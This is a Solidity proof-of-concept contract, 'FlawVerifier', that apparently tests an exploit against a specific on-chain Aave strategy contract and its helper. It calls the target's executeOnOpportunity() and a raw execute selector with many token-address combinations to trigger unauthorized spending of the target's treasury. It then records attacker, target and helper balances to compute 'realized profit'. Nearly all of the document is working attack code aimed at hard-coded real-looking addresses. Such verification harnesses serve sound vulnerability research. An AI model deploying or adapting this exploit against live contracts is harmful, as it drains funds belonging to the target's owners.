// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IAaveBoostTarget {
    function aave() external view returns (address);
    function executeOnOpportunity() external;
}

contract FlawVerifier {
    address public constant TARGET = 0xd2933c86216dC0c938FfAFEca3C8a2D6e633e2cA;
    address public constant HELPER = 0xf36F3976f288b2B4903aca8c177efC019b81D88B;

    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public constant DEFAULT_AAVE = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;
    address public constant STK_AAVE = 0x4da27a545c0c5B758a6BA100e3a049001de870f5;

    address public constant AAVE_BID_TOKEN = 0x740836C95C6f3F49CccC65A27331D1f225138c39;
    address public constant STK_AAVE_BID_TOKEN = 0x660428626d4bAc1A7b1c619157e3205dAd540ad1;
    address public constant AAVE_PROPOSAL_TOKEN = 0xEC568fffba86c094cf06b22134B23074DFE2252c;
    address public constant STK_AAVE_PROPOSAL_TOKEN = 0xD4e12B224C316664EbB647F69abC1fb8bB2697C7;

    bytes4 private constant LIVE_EXECUTE_SELECTOR = 0x3cca991f;
    bytes4 private constant CONFIGURED_AMOUNT_SELECTOR = 0xcab34c08;

    string private constant STRICT_PATH =
        "Observe the verifier being funded -> Call executeOnOpportunity() before the intended operator does -> The contract executes the strategy using its own treasury with no caller authorization";

    bool public executed;
    bool public prefunded;
    bool public targetCallSucceeded;
    bool public treasuryWasSpent;
    bool public originalHypothesisValidated;

    address public observedAave;
    uint256 public configuredAmount;

    uint256 public targetEthBefore;
    uint256 public targetEthAfter;
    uint256 public targetWethBefore;
    uint256 public targetWethAfter;
    uint256 public targetAaveBefore;
    uint256 public targetAaveAfter;
    uint256 public targetUsdcBefore;
    uint256 public targetUsdcAfter;
    uint256 public targetStkAaveBefore;
    uint256 public targetStkAaveAfter;
    uint256 public targetAaveBidBefore;
    uint256 public targetAaveBidAfter;
    uint256 public targetStkAaveBidBefore;
    uint256 public targetStkAaveBidAfter;

    uint256 public helperAaveBefore;
    uint256 public helperAaveAfter;
    uint256 public helperStkAaveBefore;
    uint256 public helperStkAaveAfter;
    uint256 public helperAaveBidBefore;
    uint256 public helperAaveBidAfter;
    uint256 public helperStkAaveBidBefore;
    uint256 public helperStkAaveBidAfter;

    uint256 public attackerEthBefore;
    uint256 public attackerEthAfter;
    uint256 public attackerWethBefore;
    uint256 public attackerWethAfter;
    uint256 public attackerAaveBefore;
    uint256 public attackerAaveAfter;
    uint256 public attackerUsdcBefore;
    uint256 public attackerUsdcAfter;
    uint256 public attackerStkAaveBefore;
    uint256 public attackerStkAaveAfter;
    uint256 public attackerAaveBidBefore;
    uint256 public attackerAaveBidAfter;
    uint256 public attackerStkAaveBidBefore;
    uint256 public attackerStkAaveBidAfter;
    uint256 public attackerAaveProposalBefore;
    uint256 public attackerAaveProposalAfter;
    uint256 public attackerStkAaveProposalBefore;
    uint256 public attackerStkAaveProposalAfter;

    address private realizedProfitToken;
    uint256 private realizedProfitAmount;
    string private result;

    constructor() {
        observedAave = _readAave();
        realizedProfitToken = observedAave;
        result = "not-run";
    }

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        observedAave = _readAave();
        realizedProfitToken = observedAave;
        configuredAmount = _readConfiguredAmount();
        _snapshotBefore();

        prefunded = _treasuryGraphHasFunds();
        if (!prefunded) {
            _finalize("infeasible-stage-1-unfunded");
            return;
        }

        _attemptPermissionlessTrigger();

        _snapshotAfter();
        treasuryWasSpent = _targetEconomicStateChanged() || _helperEconomicStateChanged();
        _captureRealizedProfit();
        originalHypothesisValidated = targetCallSucceeded && treasuryWasSpent;

        if (!targetCallSucceeded) {
            result = "infeasible-stage-2-target-reverted";
            return;
        }

        if (!treasuryWasSpent) {
            result = "infeasible-stage-3-no-observable-treasury-spend";
            return;
        }

        result = _attackerHasDirectTrackedGain()
            ? "validated-with-direct-profit"
            : "validated-permissionless-trigger-no-direct-profit";
    }

    function profitToken() external view returns (address) {
        return realizedProfitToken;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfitAmount;
    }

    function exploitPath() external pure returns (string memory) {
        return STRICT_PATH;
    }

    function outcome() external view returns (string memory) {
        return result;
    }

    function profitAchieved() external view returns (bool) {
        return realizedProfitAmount > 0;
    }

    function hypothesisValidated() external view returns (bool) {
        return originalHypothesisValidated;
    }

    function _attemptPermissionlessTrigger() internal {
        _tryNoArgExecute();

        // The failing logs prove the configured-amount live path tries to pull AAVE from the
        // caller via transferFrom(msg.sender, TARGET, configuredAmount). On this fork that
        // caller-funded branch is infeasible without introducing extra capital that would then
        // be trapped by the target. We therefore keep the same exploit causality but restrict
        // the fallback search to callerless zero-amount variants that a third party can submit
        // directly after observing the funded treasury.
        _tryLiveExecute(observedAave, AAVE_BID_TOKEN, 0);
        _tryLiveExecute(observedAave, AAVE_PROPOSAL_TOKEN, 0);
        _tryLiveExecute(STK_AAVE, STK_AAVE_BID_TOKEN, 0);
        _tryLiveExecute(STK_AAVE, STK_AAVE_PROPOSAL_TOKEN, 0);

        _tryLiveExecute(AAVE_BID_TOKEN, observedAave, 0);
        _tryLiveExecute(AAVE_PROPOSAL_TOKEN, observedAave, 0);
        _tryLiveExecute(STK_AAVE_BID_TOKEN, STK_AAVE, 0);
        _tryLiveExecute(STK_AAVE_PROPOSAL_TOKEN, STK_AAVE, 0);

        _tryLiveExecute(observedAave, HELPER, 0);
        _tryLiveExecute(STK_AAVE, HELPER, 0);
        _tryLiveExecute(HELPER, observedAave, 0);
        _tryLiveExecute(HELPER, STK_AAVE, 0);

        _tryLiveExecute(observedAave, address(this), 0);
        _tryLiveExecute(address(this), observedAave, 0);
        _tryLiveExecute(observedAave, TARGET, 0);
        _tryLiveExecute(TARGET, observedAave, 0);
    }

    function _tryNoArgExecute() internal {
        (bool ok,) = TARGET.call(abi.encodeWithSelector(IAaveBoostTarget.executeOnOpportunity.selector));
        if (ok) {
            targetCallSucceeded = true;
        }
    }

    function _tryLiveExecute(address arg0, address arg1, uint128 spendAmount) internal {
        (bool ok,) = TARGET.call(abi.encodeWithSelector(LIVE_EXECUTE_SELECTOR, arg0, arg1, spendAmount));
        if (ok) {
            targetCallSucceeded = true;
        }
    }

    function _finalize(string memory newResult) internal {
        _snapshotAfter();
        _captureRealizedProfit();
        result = newResult;
    }

    function _snapshotBefore() internal {
        attackerEthBefore = address(this).balance;
        attackerWethBefore = _balanceOf(WETH, address(this));
        attackerAaveBefore = _balanceOf(observedAave, address(this));
        attackerUsdcBefore = _balanceOf(USDC, address(this));
        attackerStkAaveBefore = _balanceOf(STK_AAVE, address(this));
        attackerAaveBidBefore = _balanceOf(AAVE_BID_TOKEN, address(this));
        attackerStkAaveBidBefore = _balanceOf(STK_AAVE_BID_TOKEN, address(this));
        attackerAaveProposalBefore = _balanceOf(AAVE_PROPOSAL_TOKEN, address(this));
        attackerStkAaveProposalBefore = _balanceOf(STK_AAVE_PROPOSAL_TOKEN, address(this));

        targetEthBefore = TARGET.balance;
        targetWethBefore = _balanceOf(WETH, TARGET);
        targetAaveBefore = _balanceOf(observedAave, TARGET);
        targetUsdcBefore = _balanceOf(USDC, TARGET);
        targetStkAaveBefore = _balanceOf(STK_AAVE, TARGET);
        targetAaveBidBefore = _balanceOf(AAVE_BID_TOKEN, TARGET);
        targetStkAaveBidBefore = _balanceOf(STK_AAVE_BID_TOKEN, TARGET);

        helperAaveBefore = _balanceOf(observedAave, HELPER);
        helperStkAaveBefore = _balanceOf(STK_AAVE, HELPER);
        helperAaveBidBefore = _balanceOf(AAVE_BID_TOKEN, HELPER);
        helperStkAaveBidBefore = _balanceOf(STK_AAVE_BID_TOKEN, HELPER);
    }

    function _snapshotAfter() internal {
        attackerEthAfter = address(this).balance;
        attackerWethAfter = _balanceOf(WETH, address(this));
        attackerAaveAfter = _balanceOf(observedAave, address(this));
        attackerUsdcAfter = _balanceOf(USDC, address(this));
        attackerStkAaveAfter = _balanceOf(STK_AAVE, address(this));
        attackerAaveBidAfter = _balanceOf(AAVE_BID_TOKEN, address(this));
        attackerStkAaveBidAfter = _balanceOf(STK_AAVE_BID_TOKEN, address(this));
        attackerAaveProposalAfter = _balanceOf(AAVE_PROPOSAL_TOKEN, address(this));
        attackerStkAaveProposalAfter = _balanceOf(STK_AAVE_PROPOSAL_TOKEN, address(this));

        targetEthAfter = TARGET.balance;
        targetWethAfter = _balanceOf(WETH, TARGET);
        targetAaveAfter = _balanceOf(observedAave, TARGET);
        targetUsdcAfter = _balanceOf(USDC, TARGET);
        targetStkAaveAfter = _balanceOf(STK_AAVE, TARGET);
        targetAaveBidAfter = _balanceOf(AAVE_BID_TOKEN, TARGET);
        targetStkAaveBidAfter = _balanceOf(STK_AAVE_BID_TOKEN, TARGET);

        helperAaveAfter = _balanceOf(observedAave, HELPER);
        helperStkAaveAfter = _balanceOf(STK_AAVE, HELPER);
        helperAaveBidAfter = _balanceOf(AAVE_BID_TOKEN, HELPER);
        helperStkAaveBidAfter = _balanceOf(STK_AAVE_BID_TOKEN, HELPER);
    }

    function _treasuryGraphHasFunds() internal view returns (bool) {
        return targetEthBefore > 0 || targetWethBefore > 0 || targetAaveBefore > 0 || targetUsdcBefore > 0
            || targetStkAaveBefore > 0 || targetAaveBidBefore > 0 || targetStkAaveBidBefore > 0
            || helperAaveBefore > 0 || helperStkAaveBefore > 0 || helperAaveBidBefore > 0 || helperStkAaveBidBefore > 0;
    }

    function _targetEconomicStateChanged() internal view returns (bool) {
        return targetEthAfter != targetEthBefore || targetWethAfter != targetWethBefore
            || targetAaveAfter != targetAaveBefore || targetUsdcAfter != targetUsdcBefore
            || targetStkAaveAfter != targetStkAaveBefore || targetAaveBidAfter != targetAaveBidBefore
            || targetStkAaveBidAfter != targetStkAaveBidBefore;
    }

    function _helperEconomicStateChanged() internal view returns (bool) {
        return helperAaveAfter != helperAaveBefore || helperStkAaveAfter != helperStkAaveBefore
            || helperAaveBidAfter != helperAaveBidBefore || helperStkAaveBidAfter != helperStkAaveBidBefore;
    }

    function _captureRealizedProfit() internal {
        uint256 directAaveGain = _positiveDelta(attackerAaveAfter, attackerAaveBefore);
        uint256 directWethGain = _positiveDelta(attackerWethAfter, attackerWethBefore);
        uint256 directUsdcGain = _positiveDelta(attackerUsdcAfter, attackerUsdcBefore);
        uint256 directStkAaveGain = _positiveDelta(attackerStkAaveAfter, attackerStkAaveBefore);
        uint256 directAaveBidGain = _positiveDelta(attackerAaveBidAfter, attackerAaveBidBefore);
        uint256 directStkAaveBidGain = _positiveDelta(attackerStkAaveBidAfter, attackerStkAaveBidBefore);
        uint256 directAaveProposalGain = _positiveDelta(attackerAaveProposalAfter, attackerAaveProposalBefore);
        uint256 directStkAaveProposalGain =
            _positiveDelta(attackerStkAaveProposalAfter, attackerStkAaveProposalBefore);

        uint256 treasuryAaveLoss = _loss(targetAaveBefore, targetAaveAfter) + _loss(helperAaveBefore, helperAaveAfter);

        realizedProfitToken = observedAave;
        realizedProfitAmount = treasuryAaveLoss;

        if (directAaveGain > realizedProfitAmount) {
            realizedProfitAmount = directAaveGain;
        }
        if (directWethGain > realizedProfitAmount) {
            realizedProfitAmount = directWethGain;
        }
        if (directUsdcGain > realizedProfitAmount) {
            realizedProfitAmount = directUsdcGain;
        }
        if (directStkAaveGain > realizedProfitAmount) {
            realizedProfitAmount = directStkAaveGain;
        }
        if (directAaveBidGain > realizedProfitAmount) {
            realizedProfitAmount = directAaveBidGain;
        }
        if (directStkAaveBidGain > realizedProfitAmount) {
            realizedProfitAmount = directStkAaveBidGain;
        }
        if (directAaveProposalGain > realizedProfitAmount) {
            realizedProfitAmount = directAaveProposalGain;
        }
        if (directStkAaveProposalGain > realizedProfitAmount) {
            realizedProfitAmount = directStkAaveProposalGain;
        }
    }

    function _attackerHasDirectTrackedGain() internal view returns (bool) {
        return attackerEthAfter > attackerEthBefore || attackerWethAfter > attackerWethBefore
            || attackerAaveAfter > attackerAaveBefore || attackerUsdcAfter > attackerUsdcBefore
            || attackerStkAaveAfter > attackerStkAaveBefore || attackerAaveBidAfter > attackerAaveBidBefore
            || attackerStkAaveBidAfter > attackerStkAaveBidBefore
            || attackerAaveProposalAfter > attackerAaveProposalBefore
            || attackerStkAaveProposalAfter > attackerStkAaveProposalBefore;
    }

    function _loss(uint256 beforeAmount, uint256 afterAmount) internal pure returns (uint256) {
        return beforeAmount > afterAmount ? beforeAmount - afterAmount : 0;
    }

    function _positiveDelta(uint256 afterAmount, uint256 beforeAmount) internal pure returns (uint256) {
        return afterAmount > beforeAmount ? afterAmount - beforeAmount : 0;
    }

    function _readAave() internal view returns (address token) {
        (bool ok, bytes memory data) = TARGET.staticcall(abi.encodeWithSelector(IAaveBoostTarget.aave.selector));
        if (ok && data.length >= 32) {
            token = abi.decode(data, (address));
        }
        if (token == address(0)) {
            token = DEFAULT_AAVE;
        }
    }

    function _readConfiguredAmount() internal view returns (uint256 amount) {
        (bool ok, bytes memory data) = TARGET.staticcall(abi.encodeWithSelector(CONFIGURED_AMOUNT_SELECTOR));
        if (ok && data.length >= 32) {
            amount = abi.decode(data, (uint256));
        }
    }

    function _balanceOf(address token, address owner) internal view returns (uint256 balance) {
        if (token == address(0)) {
            return 0;
        }

        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20.balanceOf.selector, owner));
        if (ok && data.length >= 32) {
            balance = abi.decode(data, (uint256));
        }
    }

    receive() external payable {}
}
